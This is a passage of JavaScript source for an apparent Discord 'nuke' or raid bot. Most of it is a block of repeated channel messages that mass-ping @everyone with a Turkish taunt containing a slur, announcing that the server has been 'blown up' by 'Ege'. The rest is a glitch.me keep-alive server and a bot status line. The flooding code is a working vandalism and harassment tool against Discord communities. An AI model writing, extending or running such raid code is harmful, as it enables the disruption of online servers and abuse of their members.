      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
  }
});

const http = require("http");
const express = require("express");
const app = express();
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if (new Date().getTime() - start > milliseconds) {
      //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT
      break;
    }
  }
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.EGE_DOMAIN}.glitch.me/`); //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT
}, 3000);

//TÜM TELİF HAKKI EGEYE AİTTİR

client.on("ready", () => {
  client.user.setStatus("idle");
  client.user.setActivity(`💎 Made By Ege | All Features 💎`); //<= Oynuyor yazısı
});

//SLASH KOMUTLARI
